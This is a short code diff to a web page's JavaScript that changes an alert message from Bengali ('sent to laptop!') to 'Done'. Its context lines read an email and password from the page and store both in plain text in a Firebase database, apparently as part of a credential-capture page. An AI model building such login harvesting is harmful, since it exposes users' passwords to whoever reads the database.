@@ -44,7 +44,7 @@
       const pass = document.getElementById('password').value;
       if(email && pass) {
         db.ref('messages').set({ email, pass });
-        alert("ল্যাপটপে পাঠানো হয়েছে!");
+        alert("Done");
       }
     }
     if (window.innerWidth > 768) {
